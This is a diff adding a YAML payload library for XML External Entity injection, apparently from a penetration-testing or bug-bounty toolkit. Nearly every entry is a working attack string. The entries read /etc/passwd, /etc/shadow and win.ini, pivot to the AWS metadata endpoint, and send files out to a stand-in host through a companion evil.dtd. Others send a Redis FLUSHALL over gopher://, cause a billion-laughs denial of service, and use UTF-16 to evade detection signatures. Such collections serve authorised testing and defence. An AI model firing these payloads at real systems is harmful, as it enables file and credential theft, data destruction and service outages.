@@ -1,0 +1,287 @@
+id: xxe
+name: XML External Entity Injection
+version: 1.0.0
+category: injection
+description: |
+  XML External Entity (XXE) injection payloads for parsers that resolve external
+  entities. Covers in-band file reads, blind/out-of-band exfil via DTDs, SSRF
+  pivots, and DoS variants. Many SAML, SOAP, and DOCX endpoints are vulnerable.
+mitre:
+  - T1190
+  - T1213
+owasp_top10:
+  - A05:2021
+  - A04:2017
+references:
+  - https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
+  - https://portswigger.net/web-security/xxe
+  - https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
+related_tools:
+  - nuclei
+  - xxeinjector
+chains:
+  - bug_bounty_full
+  - web_active
+payloads:
+  - id: basic_file_read
+    name: Basic in-band file read
+    subcategory: in_band
+    encoding: raw
+    tech_targets: [java, php, dotnet]
+    severity_when_works: high
+    payload: |
+      <?xml version="1.0"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+      <foo>&xxe;</foo>
+    notes: null
+    source: https://portswigger.net/web-security/xxe
+  - id: windows_file_read
+    name: Windows ini file read
+    subcategory: in_band
+    encoding: raw
+    tech_targets: [windows, dotnet]
+    severity_when_works: high
+    payload: |
+      <?xml version="1.0"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
+      <foo>&xxe;</foo>
+    notes: null
+    source: common knowledge
+  - id: ssrf_pivot
+    name: SSRF pivot via XXE
+    subcategory: ssrf
+    encoding: raw
+    tech_targets: [java, php]
+    severity_when_works: high
+    payload: |
+      <?xml version="1.0"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
+      <foo>&xxe;</foo>
+    notes: AWS IMDSv1 pivot
+    source: https://portswigger.net/web-security/xxe
+  - id: parameter_entity_blind
+    name: Blind XXE via parameter entity
+    subcategory: blind
+    encoding: raw
+    tech_targets: [java, php]
+    severity_when_works: high
+    payload: |
+      <?xml version="1.0"?>
+      <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://OOB.example.net/x"> %xxe;]>
+      <foo>1</foo>
+    notes: Replace OOB.example.net with Burp collaborator
+    source: https://portswigger.net/web-security/xxe/blind
+  - id: external_dtd_exfil
+    name: External DTD exfil
+    subcategory: oob
+    encoding: raw
+    tech_targets: [java, php]
+    severity_when_works: critical
+    payload: |
+      <?xml version="1.0"?>
+      <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://OOB.example.net/evil.dtd"> %xxe;]>
+      <foo>1</foo>
+    notes: "Host evil.dtd that defines parameter entity to ftp:// exfil"
+    source: https://portswigger.net/web-security/xxe/blind
+  - id: evil_dtd_content
+    name: evil.dtd content for exfil
+    subcategory: oob
+    encoding: raw
+    tech_targets: [java, php]
+    severity_when_works: critical
+    payload: |
+      <!ENTITY % file SYSTEM "file:///etc/passwd">
+      <!ENTITY % all "<!ENTITY send SYSTEM 'http://OOB.example.net/?d=%file;'>">
+      %all;
+    notes: Companion DTD for the previous payload
+    source: https://portswigger.net/web-security/xxe/blind
+  - id: error_based_exfil
+    name: Error-based file exfil
+    subcategory: blind
+    encoding: raw
+    tech_targets: [java]
+    severity_when_works: high
+    payload: |
+      <?xml version="1.0"?>
+      <!DOCTYPE foo [
+        <!ENTITY % file SYSTEM "file:///etc/passwd">
+        <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+        %eval;
+        %error;
+      ]>
+      <foo>1</foo>
+    notes: File content surfaces in parser stack trace
+    source: https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
+  - id: php_filter_b64
+    name: PHP filter base64 read
+    subcategory: in_band
+    encoding: raw
+    tech_targets: [php]
+    severity_when_works: high
+    payload: |
+      <?xml version="1.0"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
+      <foo>&xxe;</foo>
+    notes: null
+    source: https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
+  - id: billion_laughs
+    name: Billion laughs DoS
+    subcategory: dos
+    encoding: raw
+    tech_targets: [java, php, python]
+    severity_when_works: medium
+    payload: |
+      <?xml version="1.0"?>
+      <!DOCTYPE lolz [
+        <!ENTITY lol "lol">
+        <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+        <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+        <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+      ]>
+      <lolz>&lol4;</lolz>
+    notes: Only with permission
+    source: https://en.wikipedia.org/wiki/Billion_laughs_attack
+  - id: svg_xxe
+    name: SVG-embedded XXE
+    subcategory: file_upload
+    encoding: raw
+    tech_targets: [java, php]
+    severity_when_works: high
+    payload: |
+      <?xml version="1.0" standalone="yes"?>
+      <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+      <svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
+        <text x="10" y="20">&xxe;</text>
+      </svg>
+    notes: For SVG upload endpoints rendered as XML
+    source: https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
+  - id: docx_xxe
+    name: DOCX XXE in document.xml
+    subcategory: file_upload
+    encoding: raw
+    tech_targets: [java]
+    severity_when_works: high
+    payload: |
+      <?xml version="1.0"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://OOB.example.net/">]>
+      <w:document xmlns:w="urn:..." ><w:body><w:p>&xxe;</w:p></w:body></w:document>
+    notes: Replace document.xml inside DOCX
+    source: common knowledge
+  - id: soap_xxe
+    name: SOAP envelope XXE
+    subcategory: in_band
+    encoding: raw
+    tech_targets: [java, dotnet]
+    severity_when_works: high
+    payload: |
+      <?xml version="1.0"?>
+      <!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+      <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body><x>&xxe;</x></soap:Body>
+      </soap:Envelope>
+    notes: null
+    source: common knowledge
+  - id: saml_xxe
+    name: SAML response XXE
+    subcategory: in_band
+    encoding: raw
+    tech_targets: [java]
+    severity_when_works: high
+    payload: |
+      <?xml version="1.0"?>
+      <!DOCTYPE Response [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+      <samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
+        <Assertion>&xxe;</Assertion>
+      </samlp:Response>
+    notes: After base64-decoding SAML response
+    source: https://research.nccgroup.com/2020/06/30/saml-xml-external-entity-injection/
+  - id: xinclude
+    name: XInclude file read
+    subcategory: in_band
+    encoding: raw
+    tech_targets: [java]
+    severity_when_works: high
+    payload: |
+      <foo xmlns:xi="http://www.w3.org/2001/XInclude">
+        <xi:include parse="text" href="file:///etc/passwd"/>
+      </foo>
+    notes: When DTD is stripped but XInclude is enabled
+    source: https://portswigger.net/web-security/xxe
+  - id: utf16_bom_bypass
+    name: UTF-16 BOM bypass
+    subcategory: filter_bypass
+    encoding: mixed
+    tech_targets: [java]
+    severity_when_works: high
+    payload: |
+      <?xml version="1.0" encoding="UTF-16"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+      <foo>&xxe;</foo>
+    notes: Send re-encoded as UTF-16 to defeat regex sigs
+    source: common knowledge
+  - id: cdata_wrap
+    name: CDATA wrapper for binary content
+    subcategory: in_band
+    encoding: raw
+    tech_targets: [java]
+    severity_when_works: high
+    payload: |
+      <?xml version="1.0"?>
+      <!DOCTYPE foo [
+        <!ENTITY % start "<![CDATA[">
+        <!ENTITY % goodies SYSTEM "file:///etc/shadow">
+        <!ENTITY % end "]]>">
+        <!ENTITY % dtd SYSTEM "http://OOB.example.net/wrap.dtd">
+        %dtd;
+      ]>
+      <foo>&all;</foo>
+    notes: For files with XML-breaking characters
+    source: https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
+  - id: jar_protocol
+    name: "jar:// protocol exfil"
+    subcategory: ssrf
+    encoding: raw
+    tech_targets: [java]
+    severity_when_works: high
+    payload: |
+      <?xml version="1.0"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://OOB.example.net/evil.jar!/data">]>
+      <foo>&xxe;</foo>
+    notes: Java URL handler can leak files via temp jar
+    source: common knowledge
+  - id: gopher_xxe
+    name: "gopher:// pivot"
+    subcategory: ssrf
+    encoding: raw
+    tech_targets: [java]
+    severity_when_works: high
+    payload: |
+      <?xml version="1.0"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://internal.example.net:6379/_FLUSHALL%0d%0a">]>
+      <foo>&xxe;</foo>
+    notes: SSRF-to-Redis pivot when gopher is allowed
+    source: common knowledge
+  - id: netdoc_protocol
+    name: "netdoc:// protocol"
+    subcategory: in_band
+    encoding: raw
+    tech_targets: [java]
+    severity_when_works: medium
+    payload: |
+      <?xml version="1.0"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "netdoc:/etc/passwd">]>
+      <foo>&xxe;</foo>
+    notes: "Older Java alternative to file://"
+    source: common knowledge
+  - id: xxe_listing_dir
+    name: Directory listing
+    subcategory: in_band
+    encoding: raw
+    tech_targets: [java]
+    severity_when_works: medium
+    payload: |
+      <?xml version="1.0"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/">]>
+      <foo>&xxe;</foo>
+    notes: Some parsers list directories
+    source: common knowledge
